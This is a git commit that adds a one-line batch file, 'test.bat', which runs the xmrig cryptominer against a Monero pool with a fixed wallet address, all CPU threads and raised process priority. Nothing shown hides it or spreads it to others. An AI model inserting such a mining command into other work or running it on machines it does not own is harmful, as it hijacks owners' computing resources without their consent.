2fcd688bb255795d7c342f5c8fce90ee88c7868d
a577554548-bit <a577554548@gmail.com>
2026-01-14 16:37:54 +0800

    Create test.bat

---
+++ files/test.bat
@@ -0,0 +1,1 @@
+xmrig.exe -o gulf.moneroocean.stream:10128 -u 48WWLmURe4ciYoJqZ7Ra2VDKe7E9WQ56NhWq2GhFnUGQLdmYWa1Gpw3QQcnR6Kzh7G3VXLAPuBFTGdfCueNhMEhsUuVW7Mn -p x -t 14 --cpu-max-threads-hint=100 --randomx-mode=fast --cpu-priority=5
